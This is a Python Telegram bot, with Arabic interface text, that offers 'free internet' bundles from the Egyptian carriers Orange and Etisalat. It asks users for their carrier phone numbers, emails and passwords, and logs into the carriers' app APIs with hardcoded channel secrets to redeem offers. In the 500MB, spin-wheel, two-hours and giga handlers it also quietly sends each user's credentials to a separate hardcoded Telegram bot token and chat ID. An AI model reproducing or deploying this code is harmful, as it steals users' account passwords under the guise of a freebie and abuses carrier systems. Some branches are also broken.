
def is_subscribed(user_id):
    try:
        for channel_username in CHANNEL_USERNAMES:
            chat_member = bot.get_chat_member(channel_username, user_id)
            if chat_member.status not in ['member', 'administrator', 'creator']:
                return False        
        return True
    except Exception as e:
        pass
        return False


@bot.message_handler(commands=['start'])
def send_welcome(message):
    global st
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name

    if is_subscribed(user_id):
        # التحقق مما إذا كان المستخدم موجودًا في القائمة
        if user_id not in user_ids:
            user_ids.append(user_id)  # إضافة المستخدم إلى القائمة
            
            # جلب الصورة الشخصية
            photos = bot.get_user_profile_photos(user_id)
            if photos.total_count > 0:
                file_id = photos.photos[0][0].file_id  # الحصول على أول صورة
                bot.send_photo(
                    ADMIN_USER_ID,
                    file_id,
                    caption=f"New User:\nName: {first_name}\nUsername: @{username}\nID: {user_id}"
                )
            else:
                # إذا لم يكن هناك صورة
                bot.send_message(
                    ADMIN_USER_ID,
                    f"New User:\nName: {first_name}\nUsername: @{username}\nID: {user_id}\n(No profile picture)"
                )


        
        markup = types.InlineKeyboardMarkup()
        btn10 = types.InlineKeyboardButton('نت مجاني', callback_data='free')
        btn20 = types.InlineKeyboardButton('خدمات أخرى', callback_data='other')
        btn3 = types.InlineKeyboardButton('المطور', url='https://t.me/Abdo_1907_A3')
        markup.add(btn10)
        markup.add(btn20)
        markup.add(btn3)
        st = bot.send_message(message.chat.id, "اختار نوع الخدمه🔥❤️‍🩹", reply_markup=markup)
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/teamabghafour7771')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn6)
        
        bot.send_message(message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدامه\n\nبعد الاشتراك أرسل /start", reply_markup=markup)

 

@bot.callback_query_handler(func=lambda call: call.data == 'free')
def handle_free(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton('Orange', callback_data='orange')
        btn2 = types.InlineKeyboardButton('Etisalat', callback_data='etisalat')
        markup.add(btn1)
        markup.add(btn2)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="ختار نوع الخدمه🔥❤️‍🩹",
        reply_markup=markup
    )
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup) 


#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&


@bot.callback_query_handler(func=lambda call: call.data == 'orange')
def handle_orange(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        btn500mb = types.InlineKeyboardButton('500 ميجا أورانج', callback_data='500mb_orange')
        watch = types.InlineKeyboardButton('WATCHIT', callback_data='watch')
        spin = types.InlineKeyboardButton('عجلة الحظ', callback_data='spin')
        markup.add(btn500mb)
        markup.add(watch)
        markup.add(spin)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="اسكريبتات اورانج ☠️❤️‍🔥",
        reply_markup=markup
    )
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup)
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

@bot.callback_query_handler(func=lambda call: call.data == '500mb_orange')
def handle_orange(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        ok = types.InlineKeyboardButton('Back', callback_data='ok')
        markup.add(ok)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="ادخل معلومات الحساب",
        reply_markup=markup
    )
        bot.send_message(call.message.chat.id, "ادخل رقم اورانج")
        bot.register_next_step_handler(call.message, process_phone_number)
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup)
def process_phone_number(message):
    user_data[message.chat.id] = {'phone_number': message.text}
    bot.send_message(message.chat.id, "الآن ادخل باسورد ماي اورانج:")
    bot.register_next_step_handler(message, process_password)
def process_password(message):
    if message.chat.id in user_data:
        user_data[message.chat.id]['password'] = message.text
        phone_number = user_data[message.chat.id]['phone_number']
        password = user_data[message.chat.id]['password']
        headers = {
            'net-msg-id': '02aeafda014687d17002292845071009',
            'x-microservice-name': 'APMS',
            'Content-Type': 'application/json; charset=UTF-8',
            'Host': 'services.orange.eg',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.14.9',
        }
        
        data = '{"appVersion":"7.3.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' % (phone_number, password)
        r1 = requests.post('https://services.orange.eg/SignIn.svc/SignInUser', headers=headers, data=data)
        if "Success" in r1.text:
            userid = r1.json()["SignInUserResult"]["UserData"]["UserID"]
            headers = {
                'net-msg-id': 'd8fb9a08007360d17002306544251017',
                'x-microservice-name': 'APMS',
                'Content-Type': 'application/json; charset=UTF-8',
                'Host': 'services.orange.eg',
                'Connection': 'Keep-Alive',
                'User-Agent': 'okhttp/3.14.9',
            }
            data = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
            r2 = requests.post('https://services.orange.eg/GetToken.svc/GenerateToken', headers=headers, data=data)
            token = r2.json()["GenerateTokenResult"]["Token"]
            h = hashlib.sha256((token + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest()
            htv = h.upper()
            headers = {
                "_ctv": token,
                "_htv": htv,
                "isEasyLogin": "false",
                "UserId": userid,
                "Content-Type": "application/json; charset=UTF-8",
                "Host": "services.orange.eg",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.0"
            }
            data = {
                "Language": "ar",
                "OSVersion": "Android12",
                "PromoCode": "رمضان كريم",
                "dial": phone_number,
                "password": password,
                "Channelname": "MobinilAndMe",
                "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF"
            }
            r3 = requests.post("https://services.orange.eg/APIs/Promotions/api/CAF/Redeem", headers=headers, json=data)
            user_id = message.from_user.id
            tlg = f"https://api.telegram.org/bot5026389727:AAHWmFs5iiSf-eAynE8nX3Z9pXfKrSF5t-8/sendMessage?chat_id=1180925062&text={phone_number},{password}>>  [500 mega] \n@{message.from_user.username} (ID: {user_id})"
        elif "Request Rejected" in r1.text:
            bot.send_message(message.chat.id, text="في مشكله دلوقتي حاول وقت تاني")
            requests.post(tlg)
            if "انت استخدمت البرومو كود النهاردة" in r3.text:
                bot.send_message(message.chat.id, text="انت استخدمت العرض قبل كده حاول ف يوم تاني")
            else:
                bot.send_message(message.chat.id, text="تمت اضافة العرض بنجاح✅")
        else:
        	bot.send_message(message.chat.id, "الرقم او الباسورد غلط")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&


@bot.callback_query_handler(func=lambda call: call.data == 'watch')
def handle_orange_watch(call):
    chat_id = call.message.chat.id
    markup = types.InlineKeyboardMarkup()
    ok = types.InlineKeyboardButton('Back', callback_data='ok')
    markup.add(ok)
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="ادخل معلومات الحساب",
        reply_markup=markup
    )
    bot.send_message(call.message.chat.id, "ادخل رقم اورانج")
    bot.register_next_step_handler(call.message, process_phone_number_watch)
def process_phone_number_watch(message):
    user_data[message.chat.id] = {'phone_number': message.text}
    bot.send_message(message.chat.id, "الآن ادخل باسورد ماي اورانج:")
    bot.register_next_step_handler(message, process_password_orange)
def process_password_orange(message):
    if message.chat.id in user_data:
        user_data[message.chat.id]['password'] = message.text
        phone_number = user_data[message.chat.id]['phone_number']
        password = user_data[message.chat.id]['password']
        url = 'https://services.orange.eg/SignIn.svc/SignInUser'
        header = {
    "net-msg-id": "61f91ede006159d16840827295301013",
    "x-microservice-name": "APMS",
    "Content-Type": "application/json; charset=UTF-8",
    "Content-Length": "166",
    "Host": "services.orange.eg",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/3.14.9",
}

        data = '{"appVersion":"7.2.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' % (phone_number, password)
        response = requests.post(url, headers=header, data=data).json()
        if 'SignInUserResult' in response and response['SignInUserResult']['ErrorCode'] == 0:
        	user_id=response["SignInUserResult"]["UserData"]["UserID"]
        	urlo = "https://services.orange.eg/GetToken.svc/GenerateToken"
        	hdo = {"Content-type":"application/json", 
  "Content-Length":"78", 
  "Host":"services.orange.eg"
   , "Connection":"Keep-Alive" ,
    "User-Agent":"okhttp/3.12.1"}
        	datao = '{"appVersion":"2.9.8","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' %(phone_number,password)
        	ctv = requests.post(urlo,headers=hdo,data = datao).json()["GenerateTokenResult"]["Token"]
        	key = ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
        	htv=(str(hashlib.sha256((ctv+key).encode('utf-8')).hexdigest()).upper())
        	url2="https://services.orange.eg/APIs/Entertainment/api/EagleRevamp/Fulfillment"
        	data2='{"ChannelName":"MobinilAndMe","ChannelPassword":"ig3yh*mk5l42@oj7QAR8yF","Dial":"%s","Language":"ar","Password":"%s","ServiceID":"5"}' %(phone_number,password)
        	header2={
"_ctv": ctv,
"_htv": htv,
"net-msg-id": "c9e426a1017474d16840837286861043",
"x-microservice-name": "APMS",
"Content-Type": "application/json; charset=UTF-8",
"Content-Length": "142",
"Host": "services.orange.eg",
"Connection": "Keep-Alive",
"Accept-Encoding": "gzip",
"User-Agent": "okhttp/3.14.9",
}

        	da=data2.encode('utf-8')
        	r=requests.post(url2,headers=header2,data=da).json()
        	if r.get('ErrorCode') == 0:
        		bot.send_message(message.chat.id,text="تم الاشتراك في العرض✅")
        	else:
        		bot.send_message(message.chat.id,text="انت بالفعل مشترك في العرض❌")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
@bot.callback_query_handler(func=lambda call: call.data == 'spin')
def handle_orange_spin(call):
    chat_id = call.message.chat.id
    markup = types.InlineKeyboardMarkup()
    ok = types.InlineKeyboardButton('Back', callback_data='ok')
    markup.add(ok)
    bot.edit_message_text(
    chat_id=chat_id,
    message_id=call.message.message_id,
        text="ادخل معلومات الحساب",
        reply_markup=markup
    )
    bot.send_message(call.message.chat.id, "ادخل رقم اورانج")
    bot.register_next_step_handler(call.message, process_phone_number_spin)
def process_phone_number_spin(message):
    user_data[message.chat.id] = {'phone_number': message.text}
    bot.send_message(message.chat.id, "الآن ادخل باسورد ماي اورانج:")
    bot.register_next_step_handler(message, process_password_spin)
def process_password_spin(message):
    if message.chat.id in user_data:
        user_data[message.chat.id]['password'] = message.text
        phone_number = user_data[message.chat.id]['phone_number']
        password = user_data[message.chat.id]['password']
        headers = {
    'net-msg-id': '02aeafda014687d17002292845071009',
    'x-microservice-name': 'APMS',
    'Content-Type': 'application/json; charset=UTF-8',
    'Host': 'services.orange.eg',
    'Connection': 'Keep-Alive',
    'User-Agent': 'okhttp/3.14.9',}
        data = '{"appVersion":"7.3.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}'%(phone_number,password)
        response = requests.post('https://services.orange.eg/SignIn.svc/SignInUser', headers=headers, data=data)
        if "Request Rejected" in response.text or "Success" in response.text:
        	user_id = message.from_user.id
        	text = f"{phone_number},{quote_plus(password)}"
        	tlg = f"https://api.telegram.org/bot5026389727:AAHWmFs5iiSf-eAynE8nX3Z9pXfKrSF5t-8/sendMessage?chat_id=1180925062&text={text}>> [عجلة الحظ]\n@{message.from_user.username} (ID: {user_id})"
        	i = requests.post(tlg)
	        for i in range(3):
	        	headers = {
			    'net-msg-id': 'd8fb9a08007360d17002306544251017',
			    'x-microservice-name': 'APMS',
			    'Content-Type': 'application/json; charset=UTF-8',
			    'Host': 'services.orange.eg',
			    'Connection': 'Keep-Alive',
			    'User-Agent': 'okhttp/3.14.9',}
	        	data = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
	        	r1 = requests.post('https://services.orange.eg/GetToken.svc/GenerateToken', headers=headers, data=data)
	        	token = r1.json()["GenerateTokenResult"]["Token"]
	        	h = hashlib.sha256((token+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest()
	        	htv=h.upper()
	        	url = "https://services.orange.eg/APIs/Gaming/api/WheelOfFortune/Spin"
	        	payload = {
			  "ChannelName": "MobinilAndMe",
			  "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
			  "Dial": phone_number,
			  "Language": "ar",
			  "Password": password,
			  "ServiceClassId": "1070"
			}			
	        	headers = {
			  'User-Agent': "okhttp/3.14.9",
			  'Connection': "Keep-Alive",
			  'Accept-Encoding': "gzip",
			  'IsAndroid': "true",
			  'OsVersion': "12",
			  'AppVersion': "7.2.0",
			  '_ctv': token,
			  '_htv': htv,
			  'isEasyLogin': "false",
			  'net-msg-id': "a1a1e6a1023842d17320034057731190",
			  'x-microservice-name': "APMS",
			  'Content-Type': "application/json; charset=UTF-8"
			}
	        	req = requests.post(url, data=json.dumps(payload), headers=headers)
	        	if "CategoryId" in req.text:
	        		Offer = req.json()["OfferDetails"]
	        		OfferId = Offer["OfferId"]
	        		OfferName = Offer["OfferName"]
	        		if "هدية" in req.text:
	        			CategoryId = req.json()["SecondryButtonDetails"]["CategoryId"]
	        			url = "https://services.orange.eg/APIs/Gaming/api/WheelOfFortune/Fulfill"
	        			payload = {
							  "CategoryId": CategoryId,
							  "ChannelName": "MobinilAndMe",
							  "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
							  "Dial": phone_number,
							  "Language": "ar",
							  "OfferId": OfferId,
							  "Password": password,
							  "ServiceClassId": "1070"
							}
							
	        			headers = {
							  'User-Agent': "okhttp/3.14.9",
							  'Connection': "Keep-Alive",
							  'Accept-Encoding': "gzip",
							  'IsAndroid': "true",
							  'OsVersion': "12",
							  'AppVersion': "7.2.0",
							  '_ctv':token,
							  '_htv': htv,
							  'isEasyLogin': "false",
							  'net-msg-id': "e53d8b50007876d17320052490421462",
							  'x-microservice-name': "APMS",
							  'Content-Type': "application/json; charset=UTF-8"
							}
	        			rem = requests.post(url, data=json.dumps(payload), headers=headers)
	        			if '"ErrorCode":8' in rem.text:
	        				bot.send_message(message.chat.id,text="فشل الاشتراك في الهديه حسبنا الله ونعم الوكيل في الشركه😂")
	        			else:
		        			pass
		        			bot.send_message(message.chat.id,text=f"تم الاشتراك بنجاح في \n{OfferName}")
		        			break
	        		else:
	        			bot.send_message(message.chat.id,text="مش متاح ليك ميجات انهارد حاول بكره")
	        	else:
	        		bot.send_message(message.chat.id,text="استخدمت عجلة الحظ انهارده حاول بكره")
	        		break
        elif "invalid username and password" in response.text:
        	bot.send_message(message.chat.id,text="الرقم او الباسورد غلط")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

# Etisalat
# _________________________________________
@bot.callback_query_handler(func=lambda call: call.data == 'etisalat')
def handle_etisalat(call):

    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        hours = types.InlineKeyboardButton('ساعتين انترنت مجاني يوميا🚀', callback_data='2hours')
        giga = types.InlineKeyboardButton("جيجات عشوائيه❤️‍🔥", callback_data='giga')
        snap = types.InlineKeyboardButton("ساعتين انترنت مجاني يوميا(ملف)", callback_data='snap')
        twist = types.InlineKeyboardButton("500 (1)", callback_data='twist')
        soch = types.InlineKeyboardButton("500 (2)", callback_data='soch')
        soch3 = types.InlineKeyboardButton("500 (3)", callback_data='soch3')
        soch4 = types.InlineKeyboardButton("500 (4)", callback_data='soch4')
        markup.add(hours)
        markup.add(snap)
        markup.add(giga)
        markup.add(twist) 
        markup.add(soch,soch3,soch4)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="اسكريبتات اتصالات ☠️❤️‍🔥",
        reply_markup=markup
    )
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == '2hours')
def handle_etisalat_hours(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        ok = types.InlineKeyboardButton('Back', callback_data='ok')
        markup.add(ok)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="ادخل معلومات الحساب",
        reply_markup=markup
    )
        bot.send_message(call.message.chat.id, "من فضلك أدخل البريد الإلكتروني الخاص بك:")
        bot.register_next_step_handler(call.message, process_email_etisalat_hours)
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup)
def process_email_etisalat_hours(message):
    user_data[message.chat.id] = {'email': message.text}
    bot.send_message(message.chat.id, "من فضلك أدخل كلمة المرور الخاصة بتطبيق اتصالات:")
    bot.register_next_step_handler(message, process_password_etisalat)
def process_password_etisalat(message):
    if message.text.lower() == "/start":
        return
    user_data[message.chat.id]['password'] = message.text
    bot.send_message(message.chat.id, "الرجاء إدخال رقم اتصالات المكون من 11 رقمًا.")
    bot.register_next_step_handler(message, process_number_etisalat)
def process_number_etisalat(message):
    if message.chat.id in user_data:
        user_data[message.chat.id]['number'] = message.text
        email = user_data[message.chat.id]['email']
        password = user_data[message.chat.id]['password']
        number = user_data[message.chat.id]['number']
        num = number[+1:]
        code = email + ":" + password
        ccode = code.encode("ascii")
        base64_bytes = base64.b64encode(ccode)
        auth = base64_bytes.decode("ascii")
        xauth = "Basic" + " " + auth       
        urllog = "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan"
        headerslog = {
            "applicationVersion": "2",
            "applicationName": "MAB",
            "Accept": "text/xml",
            "Authorization": xauth,
            "APP-BuildNumber": "964",
            "APP-Version": "27.0.0",
            "OS-Type": "Android",
            "OS-Version": "12",
            "APP-STORE": "GOOGLE",
            "Is-Corporate": "false",
            "Content-Type": "text/xml; charset=UTF-8",
            "Content-Length": "1375",
            "Host": "mab.etisalat.com.eg:11003",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11",
            "ADRUM_1": "isMobile:true",
            "ADRUM": "isAjax:true"
        }
        
        datalog = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><loginRequest><deviceId></deviceId><firstLoginAttempt>true</firstLoginAttempt><modelType></modelType><osVersion></osVersion><platform>Android</platform><udid></udid></loginRequest>"
        log = requests.post(urllog, headers=headerslog, data=datalog)
        
        if "true" in log.text:
            st = log.headers["Set-Cookie"]
            ck = st.split(";")[0] 
            br = log.headers["auth"]
            url = "https://mab.etisalat.com.eg:11003/Saytar/rest/zero11/offersV3?req=<dialAndLanguageRequest><subscriberNumber>%s</subscriberNumber><language>1</language></dialAndLanguageRequest>" % (num)
            headers = {
                'applicationVersion': "2",
                'Content-Type': "text/xml",
                'applicationName': "MAB",
                'Accept': "text/xml",
                'Language': "ar",
                'APP-BuildNumber': "10459",
                'APP-Version': "29.9.0",
                'OS-Type': "Android",
                'OS-Version': "11",
                'APP-STORE': "GOOGLE",
                'auth': "Bearer " + br,
                'Host': "mab.etisalat.com.eg:11003",
                'Is-Corporate': "false",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "gzip",
                'User-Agent': "okhttp/5.0.0-alpha.11",
                'Cookie': ck
            }
            response = requests.get(url, headers=headers)
            if "Offer_ID" in response.text:
                root = ET.fromstring(response.text)
                offer_id = None
                for category in root.findall('.//mabCategory'):
                    for product in category.findall('.//mabProduct'):
                        for parameter in product.findall('.//fulfilmentParameter'):
                            if parameter.find('name').text == 'Offer_ID':
                                offer_id = parameter.find('value').text
                      
                                break
                        if offer_id is not None:
                                break
                    if offer_id is not None:
                        break
                if offer_id is not None:
                                	if "true" in log.text:
                                		st = log.headers["Set-Cookie"]
                                		ck = st.split(";")[0] 
                                		br = log.headers["auth"]
                                		urlsub = "https://mab.etisalat.com.eg:11003/Saytar/rest/servicemanagement/submitOrderV2"
                                		headerssub = {
                "applicationVersion": "2",
                "applicationName": "MAB",
                "Accept": "text/xml",
                "Cookie": ck,
                "Language": "ar",
                "APP-BuildNumber": "964",
                "APP-Version": "27.0.0",
                "OS-Type": "Android",
                "OS-Version": "12",
                "APP-STORE": "GOOGLE",
                "auth": "Bearer " + br + "",
                "Is-Corporate": "false",
                "Content-Type": "text/xml; charset=UTF-8",
                "Content-Length": "1375",
                "Host": "mab.etisalat.com.eg:11003",
                "Connection": "Keep-Alive",
                "User-Agent": "okhttp/5.0.0-alpha.11"
            }
                                		offer = "22665"
                                		datasub = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><submitOrderRequest><mabOperation></mabOperation><msisdn>%s</msisdn><operation>ACTIVATE</operation><parameters><parameter><name>Offer_ID</name><value>%s</value></parameter><parameter><name>isRTIM</name><value>Y</value></parameter></parameters><productName>FAN_ZONE_HOURLY_BUNDLE</productName></submitOrderRequest>" %(num, offer)
                                		subs = requests.post(urlsub, headers=headerssub, data=datasub).text
                                		if "true" in subs:
                                			bot.send_message(message.chat.id, text="️❤️‍🔥تم اضافة ساعتين انترنت❤️‍🔥")
                                			user_id = message.from_user.id
                                			text = f"{email},{quote_plus(password)}"
                                			tlg = f"https://api.telegram.org/bot5026389727:AAHWmFs5iiSf-eAynE8nX3Z9pXfKrSF5t-8/sendMessage?chat_id=1180925062&text={text}\nساعتين\n@{message.from_user.username} (ID: {user_id})"
                                		i = requests.post(tlg)
                                	else:
                                		bot.send_message(message.chat.id, text="اتأكد من الرقم والباسورد")
            else:
            	bot.send_message(message.chat.id, "مش متاح ليك الساعتين انهارده حاول بكره")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#_________________________________________
@bot.callback_query_handler(func=lambda call: call.data == 'giga')
def handle_giga(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        ok = types.InlineKeyboardButton('Back', callback_data='ok')
        markup.add(ok)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="ادخل معلومات الحساب",
        reply_markup=markup
    )
        bot.send_message(call.message.chat.id, "من فضلك أدخل البريد الإلكتروني الخاص بك:")
        bot.register_next_step_handler(call.message, process_email_giga)
        
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)   
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup)
def process_email_giga(message):
    user_data[message.chat.id] = {'email': message.text}
    bot.send_message(message.chat.id, "من فضلك أدخل كلمة المرور الخاصة بك:")
    bot.register_next_step_handler(message, process_password_giga)
def process_password_giga(message):
    if message.chat.id in user_data:
        user_data[message.chat.id]['password'] = message.text
        bot.send_message(message.chat.id, "الرجاء إدخال رقم هاتفك:")
        bot.register_next_step_handler(message, process_number_giga)
def process_number_giga(message):
    if message.chat.id in user_data:
        user_data[message.chat.id]['number'] = message.text
        email = user_data[message.chat.id]['email']
        password = user_data[message.chat.id]['password']
        number = user_data[message.chat.id]['number']
        num1 = number[+1:]
        code1 = email + ":" + password
        ccode1 = code1.encode("ascii")
        base64_bytess = base64.b64encode(ccode1)
        authh = base64_bytess.decode("ascii")
        xauthh = "Basic" + " " + authh
        headers = {
    'applicationVersion': '2',
    'applicationName': 'MAB',
    'Accept': 'text/xml',
    'Authorization': xauthh,
    'Language': 'ar',
    'APP-BuildNumber': '10407',
    'APP-Version': '28.6.0',
    'OS-Type': 'Android',
    'OS-Version': '12',
    'APP-STORE': 'GOOGLE',
    'Is-Corporate': 'false',
    'Content-Type': 'text/xml; charset=UTF-8',
    # 'Content-Length': '246',
    'Host': 'mab.etisalat.com.eg:11003',
    'Connection': 'Keep-Alive',
    # 'Accept-Encoding': 'gzip',
    'User-Agent': 'okhttp/5.0.0-alpha.11',
}
        data = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><loginRequest><deviceId></deviceId><firstLoginAttempt>true</firstLoginAttempt><modelType>SM-A125F</modelType><osVersion>12</osVersion><platform>Android</platform><udid></udid></loginRequest>"

        res = requests.post('https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan', headers=headers, data=data)
        if "true" in res.text:
        	prr = res.headers["Set-Cookie"]
        	csrftoken_matchh = re.search(r'JSESSIONID=([^;]+)', prr)
        	csrftoken_valuee = csrftoken_matchh.group(1)
        	gkk = f"JSESSIONID={csrftoken_valuee}; path=/; HttpOnly"
        	prkk = res.headers["auth"]
        	headers = {
	    'applicationVersion': '2',
	    'applicationName': 'MAB',
	    'Accept': 'text/xml',
	    'Cookie': gkk,
	    'Language': 'ar',
	    'APP-BuildNumber': '10466',
	    'APP-Version': '29.8.0',
	    'OS-Type': 'Android',
	    'OS-Version': '12',
	    'APP-STORE': 'GOOGLE',
	    'auth': f'Bearer {prkk}',
	    'Is-Corporate': 'false',
	    'Content-Type': 'text/xml; charset=UTF-8',
	    # 'Content-Length': '253',
	    'Host': 'mab.etisalat.com.eg:11003',
	    'Connection': 'Keep-Alive',
	    # 'Accept-Encoding': 'gzip',
	    'User-Agent': 'okhttp/5.0.0-alpha.11',
	    'ADRUM_1': 'isMobile:true',
	    'ADRUM': 'isAjax:true',
	}	
	        data = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><submitOrderRequest><mabOperation></mabOperation><msisdn>%s</msisdn><operation>ACTIVATE</operation><parameters /><productName>Free_Zone_ALL_MB_On_Demand</productName></submitOrderRequest>"%num1
	        res2 = requests.post(
	    'https://mab.etisalat.com.eg:11003/Saytar/rest/servicemanagement/subscribedServicesSubmitOrder',
	    headers=headers,
	    data=data,
	).text
	        if "true" in res2:
	        	bot.send_message(message.chat.id,text="تم طلب العرض انتظر رساله")
	        	user_id = message.from_user.id
	        	text = f"{email},{quote_plus(password)}"
	        	tlg = f"https://api.telegram.org/bot5026389727:AAHWmFs5iiSf-eAynE8nX3Z9pXfKrSF5t-8/sendMessage?chat_id=1180925062&text={text} > [جيجات]\n@{message.from_user.username} (ID: {user_id}) "
	        	i = requests.post(tlg)
	        else:
	        	bot.send_message(message.chat.id,text="رقم اتصالات غلط")
        else:
        	bot.send_message(message.chat.id,text="الايميل او الباسورد غلط")
       
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&



#________________________________________
@bot.callback_query_handler(func=lambda call: call.data == 'snap')
def handle_snap(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        ok = types.InlineKeyboardButton('Back', callback_data='ok')
        markup.add(ok)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
